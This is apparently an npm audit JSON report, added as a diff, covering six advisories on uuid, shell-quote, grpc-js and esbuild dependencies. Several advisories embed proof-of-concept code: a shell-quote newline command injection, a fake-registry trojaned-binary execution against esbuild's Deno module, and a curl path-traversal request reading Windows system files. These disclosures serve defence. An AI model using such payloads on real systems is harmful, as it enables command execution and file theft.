@@ -1,0 +1,265 @@
+{
+  "actions": [],
+  "advisories": {
+    "1119441": {
+      "findings": [
+        {
+          "version": "8.3.2",
+          "paths": [
+            "examples__winston-azure-application-insights__cjs>applicationinsights>@azure/functions>uuid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq\n- https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34\n- https://github.com/uuidjs/uuid/releases/tag/v14.0.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41907\n- https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e\n- https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d\n- https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a\n- https://github.com/uuidjs/uuid/releases/tag/v11.1.1\n- https://github.com/uuidjs/uuid/releases/tag/v12.0.1\n- https://github.com/uuidjs/uuid/releases/tag/v13.0.1\n- https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+      "created": "2026-04-22T20:53:24.000Z",
+      "id": 1119441,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+      "reported_by": null,
+      "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41907"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "uuid",
+      "vulnerable_versions": "<11.1.1",
+      "github_advisory_id": "GHSA-w5hq-g745-h8pq",
+      "recommendation": "Upgrade to version 11.1.1 or later",
+      "patched_versions": ">=11.1.1",
+      "updated": "2026-05-21T18:25:57.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-787",
+        "CWE-1285"
+      ],
+      "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+    },
+    "1120422": {
+      "findings": [
+        {
+          "version": "1.8.3",
+          "paths": [
+            "examples__build-azure-local-settings__esbuild>npm-run-all2>shell-quote"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/shell-quote/security/advisories/GHSA-w7jw-789q-3m8p\n- https://nvd.nist.gov/vuln/detail/CVE-2026-9277\n- https://github.com/ljharb/shell-quote/commit/1518179\n- https://github.com/ljharb/shell-quote\n- https://www.npmjs.com/package/shell-quote\n- http://www.openwall.com/lists/oss-security/2026/05/23/2\n- https://github.com/advisories/GHSA-w7jw-789q-3m8p",
+      "created": "2026-06-09T14:27:15.000Z",
+      "id": 1120422,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`shell-quote`'s `quote()` function did not validate object-token inputs against the operator model used by `parse()`. The `.op` field was backslash-escaped character by character using `/(.)/g`, which in JavaScript does not match line terminators (`\\n`, `\\r`, U+2028, U+2029). A line terminator in `.op` therefore passed through unescaped into the output; POSIX shells treat a literal `\\n` as a command separator, so any content after it would execute as a second command.\n\nThe vulnerable code path is reachable in two ways. Neither requires the parser to misbehave — `parse()` only emits ops from a fixed control set — but both are documented API surface:\n\n1. **Direct construction.** A caller builds `{ op: '...\\n...' }` from external input (e.g. a deserialized argument array) and passes it to `quote()`.\n2. **`envFn` return.** `parse(cmd, envFn)` is documented to splice the return value of `envFn` into the result array when it is an object. An attacker-influenced data source consulted by `envFn` can introduce an object token whose `.op` reaches `quote()`.\n\n### Impact\n\nShell command injection in callers that pass object tokens with attacker-influenced `.op` values to `quote()` and then hand the result to a shell. The preconditions are narrower than ordinary string injection — they require the caller to feed object tokens into `quote()` — but object tokens are a public, documented part of the API surface, and `quote()` is intended to be a shell-safety boundary.\n\n### PoC\n\n```js\nconst { parse, quote } = require('shell-quote');\n\n// Direct construction\nquote([{ op: ';\\nid' }]);\n// → \"\\;\\n\\\\i\\\\d\"  ← literal newline; second line executes as a command\n\n// Via parse() with an envFn returning attacker-shaped objects\nconst tokens = parse('echo $X', () => ({ op: ';\\nid' }));\nrequire('child_process').execSync(quote(tokens), { shell: true });\n// Executes `id` after `echo \\;`.\n```\n\nConfirmed under `sh`, `bash`, `dash`, and `zsh`.\n\n### Patch\n\nFixed by replacing the per-character escape with strict shape validation in `quote()`. The object-token branch now:\n\n- **`{ op }`** — `.op` must be a string from the same allowlist the parser emits (`||`, `&&`, `;;`, `|&`, `<(`, `<<<`, `>>`, `>&`, `<&`, `&`, `;`, `(`, `)`, `|`, `<`, `>`). Anything else throws `TypeError`. This is the direct fix for the reported issue and removes the entire class of `.op` injection.\n- **`{ op: 'glob', pattern }`** — `.pattern` must be a string with no line terminators. Glob metacharacters (`*`, `?`, `[`, `]`, `{`, `}`, `,`) pass through; all other shell-special characters are backslash-escaped. (Previously the pattern field was discarded entirely and the literal string `\\g\\l\\o\\b` was emitted — a latent bug, not security-relevant.)\n- **`{ comment }`** — `.comment` must be a string with no line terminators (line terminators would end the shell comment and resume command parsing — same injection shape).\n- **Any other object shape** — `TypeError`.\n\nThe fix is allowlist-based rather than a targeted regex tweak, so it closes the reported vector and forecloses adjacent ones (U+2028 / U+2029 line separators in `.op`, line terminators in comments, unknown-shape objects coerced through `.replace`).\n\n### Workarounds\n\nPrior to upgrading, callers that build object tokens from untrusted input should validate `.op` against the parser's operator set themselves, and never construct `{ op }` from attacker-controlled strings.\n\n### Credits\n\nReported by Akshat Sinha",
+      "reported_by": null,
+      "title": "shell-quote quote() does not escape newlines in object .op values",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-9277"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "shell-quote",
+      "vulnerable_versions": ">=1.1.0 <=1.8.3",
+      "github_advisory_id": "GHSA-w7jw-789q-3m8p",
+      "recommendation": "Upgrade to version 1.8.4 or later",
+      "patched_versions": ">=1.8.4",
+      "updated": "2026-06-09T14:27:16.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-77",
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-w7jw-789q-3m8p"
+    },
+    "1120582": {
+      "findings": [
+        {
+          "version": "1.14.3",
+          "paths": [
+            "examples__winston-azure-application-insights__cjs>applicationinsights>@azure/monitor-opentelemetry>@opentelemetry/sdk-node>@opentelemetry/exporter-logs-otlp-grpc>@grpc/grpc-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/grpc/grpc-node/security/advisories/GHSA-5375-pq7m-f5r2\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.10.12\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.11.4\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.12.7\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.13.5\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.14.4\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.9.16\n- https://github.com/advisories/GHSA-5375-pq7m-f5r2",
+      "created": "2026-06-11T13:27:54.000Z",
+      "id": 1120582,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nAn invalid incoming HTTP/2 stream initiation can cause a server process to crash. This affects all servers created using @grpc/grpc-js.\n\n### Patches\nThe following version have fixes for this vulnerability:\n\n - 1.9.16\n - 1.10.12\n - 1.11.4\n - 1.12.7\n - 1.13.5\n - 1.14.4\n\n### Workarounds\nThere is no workaround.",
+      "reported_by": null,
+      "title": "@grpc/grpc-js: A malformed request can cause a server crash",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-48068"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@grpc/grpc-js",
+      "vulnerable_versions": ">=1.14.0 <1.14.4",
+      "github_advisory_id": "GHSA-5375-pq7m-f5r2",
+      "recommendation": "Upgrade to version 1.14.4 or later",
+      "patched_versions": ">=1.14.4",
+      "updated": "2026-06-11T13:27:57.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-5375-pq7m-f5r2"
+    },
+    "1120588": {
+      "findings": [
+        {
+          "version": "1.14.3",
+          "paths": [
+            "examples__winston-azure-application-insights__cjs>applicationinsights>@azure/monitor-opentelemetry>@opentelemetry/sdk-node>@opentelemetry/exporter-logs-otlp-grpc>@grpc/grpc-js"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/grpc/grpc-node/security/advisories/GHSA-99f4-grh7-6pcq\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.10.12\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.11.4\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.12.7\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.13.5\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.14.4\n- https://github.com/grpc/grpc-node/releases/tag/%40grpc%2Fgrpc-js%401.9.16\n- https://github.com/advisories/GHSA-99f4-grh7-6pcq",
+      "created": "2026-06-11T13:27:44.000Z",
+      "id": 1120588,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nAn invalid incoming compressed message can cause a client or server process to crash. This affects all clients and servers that use @grpc/grpc-js\n\n### Patches\nThe following version have fixes for this vulnerability:\n\n - 1.9.16\n - 1.10.12\n - 1.11.4\n - 1.12.7\n - 1.13.5\n - 1.14.4\n\n### Workarounds\nThere is no workaround.",
+      "reported_by": null,
+      "title": "@grpc/grpc-js: An incoming malformed compressed message can cause a client or server crash",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-48069"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@grpc/grpc-js",
+      "vulnerable_versions": ">=1.14.0 <1.14.4",
+      "github_advisory_id": "GHSA-99f4-grh7-6pcq",
+      "recommendation": "Upgrade to version 1.14.4 or later",
+      "patched_versions": ">=1.14.4",
+      "updated": "2026-06-11T13:27:47.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-99f4-grh7-6pcq"
+    },
+    "1120679": {
+      "findings": [
+        {
+          "version": "0.27.7",
+          "paths": [
+            "examples__build-azure-local-settings__esbuild>esbuild"
+          ]
+        },
+        {
+          "version": "0.28.0",
+          "paths": [
+            "examples__build-azure-local-settings__esbuild>tsx>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-gv7w-rqvm-qjhr\n- https://github.com/evanw/esbuild/releases/tag/v0.28.1\n- https://github.com/advisories/GHSA-gv7w-rqvm-qjhr",
+      "created": "2026-06-12T20:08:59.000Z",
+      "id": 1120679,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe esbuild Deno module (`lib/deno/mod.ts`) downloads native binary executables from an npm registry and writes them to disk with executable permissions (`0o755`) **without performing any integrity verification** (e.g., SHA-256 hash check). The Node.js equivalent (`lib/npm/node-install.ts`) includes a robust `binaryIntegrityCheck()` function that verifies SHA-256 hashes against hardcoded expected values from `package.json`, but this protection was never implemented for the Deno distribution.\n\nWhen the `NPM_CONFIG_REGISTRY` environment variable is set, the Deno module constructs a download URL using this attacker-influenced value and fetches a native binary from it. Because no integrity check is performed, an attacker who can control this environment variable (common in CI/CD pipelines, shared development environments, or corporate networks with custom npm registries) can supply a malicious binary that will be downloaded, written to disk, and executed with the privileges of the Deno process, achieving full remote code execution.\n\n### Details\n\n**Vulnerable code path** — `lib/deno/mod.ts` lines 62–82:\n\n```typescript\nasync function installFromNPM(name: string, subpath: string): Promise<string> {\n  const { finalPath, finalDir } = getCachePath(name)\n  try { await Deno.stat(finalPath); return finalPath } catch (e) {}\n\n  const npmRegistry = Deno.env.get(\"NPM_CONFIG_REGISTRY\") || \"https://registry.npmjs.org\"  // line 70: attacker-controlled\n  const url = `${npmRegistry}/${name}/-/${name.replace(\"@esbuild/\", \"\")}-${version}.tgz`     // line 71: URL uses attacker base\n  const buffer = await fetch(url).then(r => r.arrayBuffer())                                  // line 72: download\n  const executable = extractFileFromTarGzip(new Uint8Array(buffer), subpath)                   // line 73: extract\n\n  await Deno.mkdir(finalDir, { recursive: true, mode: 0o700 })\n  await Deno.writeFile(finalPath, executable, { mode: 0o755 })                                 // line 80: write + chmod\n  return finalPath                                                                              // line 81: no hash check\n}\n```\n\n**Missing protection** — The Node.js equivalent at `lib/npm/node-install.ts` lines 228–234:\n\n```typescript\nfunction binaryIntegrityCheck(pkg: string, subpath: string, bytes: Uint8Array): void {\n  const hash = crypto.createHash('sha256').update(bytes).digest('hex')\n  const key = `${pkg}/${subpath}`\n  const expected = packageJSON['esbuild.binaryHashes'][key]\n  if (!expected) throw new Error(`Missing hash for \"${key}\"`)\n  if (hash !== expected) throw new Error(...)\n}\n```\n\nThis function is called in both the `installUsingNPM()` path (line 131) and the `downloadDirectlyFromNPM()` path (line 243), but **no equivalent exists in the Deno module**. Searching the entire git history confirms `binaryIntegrityCheck`, `binaryHashes`, `sha256`, and `hash` have never appeared in `lib/deno/mod.ts`.\n\n**Execution flow after download:** The binary returned by `installFromNPM()` is passed to `spawn()` at line 291 of the same file:\n```typescript\nconst child = spawn(binPath, { args: [`--service=${version}`], ... })\n```\n\n**Attack vector:** The `NPM_CONFIG_REGISTRY` environment variable is a standard npm configuration variable widely used in enterprise CI/CD pipelines to point to internal artifact repositories (Artifactory, Nexus, Verdaccio, etc.). An attacker who can inject or modify this variable in a build environment (e.g., via CI config injection, shared environment, or compromised registry) can redirect the download to a server they control and serve a trojaned native binary.\n\n### PoC\n\n**Prerequisites:** Deno runtime, Node.js (for fake registry)\n\n**Step 1:** Create a fake npm registry that serves a malicious binary:\n\n```javascript\n// fake-registry.js\nconst http = require('http');\nconst zlib = require('zlib');\nhttp.createServer((req, res) => {\n  const fakeBin = '#!/bin/sh\\necho PWNED > /tmp/deno-esbuild-rce-proof.txt\\necho fake-esbuild-0.28.0\\n';\n  // ... build tar.gz with fake binary as package/bin/esbuild ...\n  res.writeHead(200, {'Content-Length': gz.length});\n  res.end(gz);\n}).listen(19876, () => console.log('READY'));\n```\n\n**Step 2:** Run the PoC with `NPM_CONFIG_REGISTRY` pointing to the fake server:\n\n```typescript\n// poc.ts — mimics lib/deno/mod.ts installFromNPM code path\nconst npmRegistry = Deno.env.get(\"NPM_CONFIG_REGISTRY\") || \"https://registry.npmjs.org\";\nconst url = `${npmRegistry}/@esbuild/linux-x64/-/linux-x64-0.28.0.tgz`;\nconst buffer = new Uint8Array(await (await fetch(url)).arrayBuffer());\n// ... gzip decompress + tar extraction (same as extractFileFromTarGzip) ...\nawait Deno.writeFile(\"/tmp/downloaded-binary\", executable, { mode: 0o755 });\n// *** NO integrity check performed ***\nconst cmd = new Deno.Command(\"/tmp/downloaded-binary\");\nawait cmd.output(); // RCE: executes attacker-controlled binary\n```\n\n**Step 3:** Run:\n```bash\nnode fake-registry.js &\nNPM_CONFIG_REGISTRY=\"http://127.0.0.1:19876\" deno run --allow-all poc.ts\ncat /tmp/deno-esbuild-rce-proof.txt  # Output: PWNED\n```\n\n**Observed output in this environment:**\n```\nDownload URL: http://127.0.0.1:19876/@esbuild/linux-x64/-/linux-x64-0.28.0.tgz\nBinary written to: /tmp/deno-poc/downloaded-binary\nBinary content: #!/bin/sh\necho PWNED > /tmp/deno-esbuild-rce-proof.txt\necho fake-esbuild-0.28.0\n\nExecuting downloaded binary...\nstdout: fake-esbuild-0.28.0\n\n*** RCE CONFIRMED ***\nMarker file content: PWNED\n```\n\n**Build-local verification — using the actual built `deno/mod.js`:**\n\nThe esbuild Deno module was built from source (`node scripts/esbuild.js ./esbuild --deno`) producing `deno/mod.js`. The fake registry test was then re-run using the **actual module** via `import * as esbuild from \"file:///path/to/deno/mod.js\"`, triggering the real `installFromNPM()` → `installFromNPM()` code path:\n\n```\n[TEST] esbuild Deno module loaded\n[TEST] esbuild version: 0.28.0\n\n[TEST] *** RCE VIA ACTUAL MODULE CONFIRMED ***\n[TEST] Marker file content: VULN-CONFIRMED\n[TEST] The actual built deno/mod.js downloaded and executed\n[TEST] a malicious binary from the fake registry WITHOUT\n[TEST] performing any SHA-256 integrity verification.\n```\n\nThe malicious binary was cached at `~/.cache/esbuild/bin/@esbuild-linux-x64@0.28.0` with contents:\n```\n#!/bin/sh\necho \"VULN-CONFIRMED\" > /tmp/esbuild-deno-verify-rce.txt\necho \"0.28.0\"\n```\n\nBuilt-in Deno module (`deno/mod.js`) confirmed to contain `NPM_CONFIG_REGISTRY` usage (line 1900) and zero references to `binaryIntegrityCheck`, `binaryHashes`, `sha256`, or `crypto.createHash`.\n\n**Negative/control case — Node.js rejects the same fake binary:**\n```\nFake binary SHA-256: d85234b9bac94fcda135d112f0c23d9c31bbb14a5502a37e743a3cf2a3750fa1\nExpected hash:       aafacdf135322bf47c882a4ea4db33d0375583f5b9c3fd2d4e12258e470568be\nHashes match: false\n=> Node.js path REJECTS the fake binary (hash mismatch)\n=> Deno path ACCEPTS it without any check\n```\n\n### Impact\n\nAn attacker who can control the `NPM_CONFIG_REGISTRY` environment variable in a Deno project using esbuild can achieve **arbitrary code execution** with the privileges of the Deno process. This is particularly relevant in:\n\n- **CI/CD pipelines** where `NPM_CONFIG_REGISTRY` is commonly set to point to internal artifact repositories\n- **Shared development environments** where environment variables may be inherited from parent processes\n- **Corporate networks** where npm registry mirrors are configured via this environment variable\n\nThe attacker does not need to compromise the npm registry itself — only the environment variable or network path between the Deno process and the registry.\n\n### Suggested remediation\n\n1. **Add SHA-256 integrity verification to the Deno module**, mirroring the existing `binaryIntegrityCheck()` function from `lib/npm/node-install.ts`:\n\n```typescript\n// In lib/deno/mod.ts, after extracting the binary:\nconst hashBuffer = await crypto.subtle.digest(\"SHA-256\", executable);\nconst hash = Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');\nconst key = `${name}/${subpath}`;\nconst expected = EXPECTED_HASHES[key]; // Import from a shared hash manifest\nif (hash !== expected) throw new Error(`Binary integrity check failed for \"${key}\"`);\n```\n\n2. **Validate the `NPM_CONFIG_REGISTRY` URL** to ensure it uses HTTPS (or at minimum warn about HTTP):\n\n```typescript\nconst npmRegistry = Deno.env.get(\"NPM_CONFIG_REGISTRY\") || \"https://registry.npmjs.org\";\nif (npmRegistry.startsWith(\"http://\")) {\n  console.warn(`[esbuild] Warning: NPM_CONFIG_REGISTRY uses insecure HTTP`);\n}\n```\n\n3. **Add `ESBUILD_BINARY_PATH` validation** in the Deno module, mirroring the `isValidBinaryPath()` check from `lib/npm/node-platform.ts`.\n\n**Regression test suggestion:** Add a test that verifies the Deno download path rejects a binary with a mismatched SHA-256 hash.",
+      "reported_by": null,
+      "title": "esbuild: Missing binary integrity verification in Deno module enables remote code execution via NPM_CONFIG_REGISTRY",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "esbuild",
+      "vulnerable_versions": ">=0.17.0 <0.28.1",
+      "github_advisory_id": "GHSA-gv7w-rqvm-qjhr",
+      "recommendation": "Upgrade to version 0.28.1 or later",
+      "patched_versions": ">=0.28.1",
+      "updated": "2026-06-12T20:08:59.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-426",
+        "CWE-494"
+      ],
+      "url": "https://github.com/advisories/GHSA-gv7w-rqvm-qjhr"
+    },
+    "1120680": {
+      "findings": [
+        {
+          "version": "0.27.7",
+          "paths": [
+            "examples__build-azure-local-settings__esbuild>esbuild"
+          ]
+        },
+        {
+          "version": "0.28.0",
+          "paths": [
+            "examples__build-azure-local-settings__esbuild>tsx>esbuild"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-g7r4-m6w7-qqqr\n- https://github.com/evanw/esbuild/releases/tag/v0.28.1\n- https://github.com/advisories/GHSA-g7r4-m6w7-qqqr",
+      "created": "2026-06-12T20:08:53.000Z",
+      "id": 1120680,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe development server contains a path traversal vulnerability on Windows when serving files from `servedir`.\n\nDue to the use of `path.Clean()` (which only normalizes forward-slash `/` separators) instead of a Windows-aware path normalization function, it is possible to craft requests using backslashes (`\\`) that bypass the intended directory containment logic. An attacker can escape the configured `servedir` root and access arbitrary files on the filesystem.\nThis issue affects Windows environments only.\n\n### Details\n\nThe request path is sanitized using:\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\nqueryPath := path.Clean(req.URL.Path)[1:]\n```\n\n\nHowever:\n- `path.Clean()` is POSIX-style and only understands `/` (docs: `https://pkg.go.dev/path#Clean`)\n- On Windows, `\\` is a valid path separator\n- `path.Clean()` does not treat `\\` as a separator\n\nLater, the server constructs the absolute path:\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L221\nabsPath := h.fs.Join(h.servedir, queryPath)\n```\n\nIf `queryPath` contains sequences such as:\n```\n..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini\n```\n\n`path.Clean()` will not normalize them, but the Windows filesystem will interpret `\\` as directory separators when resolving `absPath`.\nBecause the implementation does not verify that the final resolved path remains within `servedir`, it allows directory traversal outside the intended root directory.\n### Vulnerable Code\n\n```go\n// https://github.com/evanw/esbuild/blob/v0.27.3/pkg/api/serve_other.go#L165\n\tqueryPath := path.Clean(req.URL.Path)[1:]\n\t....\n\t// Check for a file in the \"servedir\" directory\n\tif h.servedir != \"\" && kind != fs.FileEntry {\n\t\tabsPath := h.fs.Join(h.servedir, queryPath)\n\t\tif absDir := h.fs.Dir(absPath); absDir != absPath {\n\t\t\tif entries, err, _ := h.fs.ReadDirectory(absDir); err == nil {\n\t\t\t\tif entry, _ := entries.Get(h.fs.Base(absPath)); entry != nil && entry.Kind(h.fs) == fs.FileEntry {\n\t....\t\t\t\t\n```\n\n\n### Steps to reproduce\n\n```\nnpm install --save-exact --save-dev esbuild\n\necho \"console.log(1)\" > app.js\n\n.\\node_modules\\.bin\\esbuild --version\n0.27.3\n\n.\\node_modules\\.bin\\esbuild app.js --bundle --outdir=www --servedir=www --watch\n\ncurl -i --path-as-is \"http://localhost:8000/..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini\"\n<content of Windows\\system.ini>\n```\n\n\n### Impact\n\n- Arbitrary file read on Windows\n- Exposure of sensitive files",
+      "reported_by": null,
+      "title": "esbuild allows arbitrary file read when running the development server on Windows",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "esbuild",
+      "vulnerable_versions": ">=0.27.3 <0.28.1",
+      "github_advisory_id": "GHSA-g7r4-m6w7-qqqr",
+      "recommendation": "Upgrade to version 0.28.1 or later",
+      "patched_versions": ">=0.28.1",
+      "updated": "2026-06-12T20:08:54.000Z",
+      "cvss": {
+        "score": 2.5,
+        "vectorString": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-g7r4-m6w7-qqqr"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 2,
+      "moderate": 1,
+      "high": 4,
+      "critical": 1
+    },
+    "dependencies": 1273,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1273
+  }
+}
